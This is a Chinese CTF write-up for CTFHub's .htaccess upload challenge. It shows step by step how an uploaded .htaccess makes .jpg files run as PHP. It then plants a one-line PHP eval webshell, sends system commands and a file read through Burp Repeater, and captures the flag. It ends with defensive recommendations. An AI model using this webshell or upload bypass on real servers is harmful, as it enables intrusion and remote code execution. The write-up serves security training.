【CTFHub】Web-htaccess Writeup

操作者：何芊宏 | 操作日期：2026.9.19 | 分类：CTF | 标签：CTFHub, Web, 文件上传, htaccess, BurpSuite

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - 文件上传 / .htaccess
  • 题目名称：.htaccess
  • 提示：利用 Apache 服务器的分布式配置文件特性，修改文件解析规则

2. 解题思路

本题的核心原理是 Apache 服务器特有的 .htaccess 文件。该文件可用于配置当前目录的网页行为。我们可以上传一个内容为 AddType application/x-httpd-php .jpg 的 .htaccess 文件，强制服务器将当前目录下的 .jpg 文件当作 PHP 脚本执行。随后，我们再上传一个包含木马代码的 shell.jpg，从而绕过常规的上传后缀限制，实现代码执行。

3. 操作步骤

第一步：本地文件制作与 Windows 绕坑

由于 Windows 系统无法直接创建以点开头的特殊文件名，直接保存 .htaccess 会报错或变成 .htaccess.txt。

  • 解决办法一（引号大法）：在 VS Code 保存时，将文件名输入为包含双引号的 ".htaccess"，强行创建。
  • 解决办法二（曲线救国）：在本地创建一个正常的 htaccess.txt，上传时用 Burp Suite 拦截，手动将 filename 改为 .htaccess。

随后创建 shell.jpg，内容仅包含 <?php @eval($_POST['cmd']); ?>。

第二步：上传 .htaccess（修改规则）

  1. 开启 CTFHub 环境，确保 Burp 处于拦截开启状态。
  2. 在 Burp 浏览器中选择 htaccess.txt 上传。
  3. 拦截请求后，找到第16行 filename="htaccess.txt"，手动改为 filename=".htaccess"。直接放行，提示上传成功。

第三步：上传 shell.jpg 与 Repeater 连马（熟练操作）

  1. 在浏览器选择 shell.jpg，直接上传，无需修改任何数据包，放行。
  2. 将上传成功的请求发送至 Repeater，修改第一行为：POST /upload/shell.jpg HTTP/1.1。
  3. 修改 Content-Type 为 application/x-www-form-urlencoded，清空请求体，写入 cmd=system("ls /");。
  4. 将 Content-Length 改为 19，保留空行，点击 Send。成功回显根目录列表，证明 .jpg 被成功解析为 PHP！

第四步：全盘搜索 Flag（巧妙躲坑）

  1. 将请求体替换为：cmd=system("find / -name flag* 2>/dev/null");。手动计算长度，该命令长度为 45，修改 Content-Length: 45。点击 Send。
  2. 结果回显路径：/var/www/html/flag_325144095.php。

第五步：读取 Flag 与 PHP 原生函数破局

  • 试错踩坑：基于上一关的经验，我们深知 CTFHub 的沙盒环境可能为了安全（防止容器被逃逸）而禁用了某些高危系统命令（如 cat），或者限制了特定文件的读取权限。直接使用 system("cat ...") 极容易遭遇回显空白或截断。
  • 成功绕过：放弃底层系统命令，改用 PHP 原生函数读取。
    将请求体改为：cmd=print_r(file_get_contents('/var/www/html/flag_325144095.php'));
    这行代码总长度为 67，修改 Content-Length: 67，点击 Send。
  • 结果：右侧成功完整打印出 Flag：
    ctfhub{e354135699134bb823d6157a}

4. 踩坑记录与复盘

  • Windows 特殊文件名机制：Windows 资源管理器无法直接创建以点开头的文件（如 .htaccess）。使用保存为 ".htaccess" 的方式，或者在 Burp 中利用 filename="htaccess.txt" 改名，是两种最实用的解决手段。
  • HTTP 协议细节再次重演：照例在第一行改 POST，清理 Body，精确计算 Content-Length 并保留空行。基础操作已经形成肌肉记忆。
  • 禁用函数带来的“虚假失败”（今日重点）：即使 .htaccess 成功生效、木马已经执行，我们也可能遇到 system("cat ...") 无回显的情况。此时不要怀疑漏洞利用失败，而应该立即调整策略，使用 print_r()、file_get_contents() 等 PHP 原生函数来读取文件。
  • 命令符号的极致严谨：在输入 find 命令时，曾因手误漏打了斜杠（误写为 "-name flag*" 而缺失开头的 "find / "），导致回显长度为 0。在后续的漏洞利用中，务必对 Shell 命令的长度和字符保持一丝不苟的严谨态度。

5. 知识总结

  • htaccess 漏洞利用原理：.htaccess 是 Apache 服务器的分布式配置文件。在允许上传的目录中上传该文件，通过 AddType application/x-httpd-php .jpg 等指令，可以强行改变服务器对指定后缀的解析行为，将静态资源（.jpg）转化为可执行的 PHP 脚本。
  • 沙盒环境下的策略选择：在受限的 Web 沙盒环境中，PHP 原生的文件读取函数（如 file_get_contents）比底层系统命令（如 cat）具有更高的可用性和稳定性，是安全测试中的必备替代方案。
  • 安全防御建议：严禁上传目录下出现 .htaccess、.user.ini 等配置文件；上传目录必须剥离脚本执行权限（可在 Nginx/Apache 配置中做 Location 限制）；强制重命名上传文件，防止用户自定义特殊后缀。最根本的方案是将 Web 服务与上传文件目录分离（即将上传目录设置为不可执行）。
